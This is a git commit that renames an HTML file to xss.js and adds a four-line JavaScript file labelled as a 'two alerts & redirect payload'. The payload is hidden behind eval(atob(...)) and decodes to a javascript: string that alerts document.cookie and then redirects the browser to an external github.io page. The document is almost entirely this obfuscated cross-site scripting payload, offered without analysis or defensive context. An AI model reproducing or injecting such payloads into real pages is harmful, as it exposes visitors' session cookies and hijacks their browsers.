fa95073ff32f2eb2d863c24df9d82db2ac7a2fb0
Roberto Nunes <46332131+Akokonunes@users.noreply.github.com>
2021-06-01 08:08:40 +0900

    Update and rename Covid19.html to xss.js

---
+++ xss.js
@@ -0,0 +1,4 @@
+/*!
+- [ JavaScript ] Two alerts & redirect payload
+*/
+eval(atob(`amF2YXNjcmlwdDphbGVydChgMHhfQWtva29gKTthbGVydChkb2N1bWVudC5jb29raWUpO3dpbmRvdy5sb2NhdGlvbj0naHR0cHM6Ly9ha29rb251bmVzLmdpdGh1Yi5pby8nOw==`));
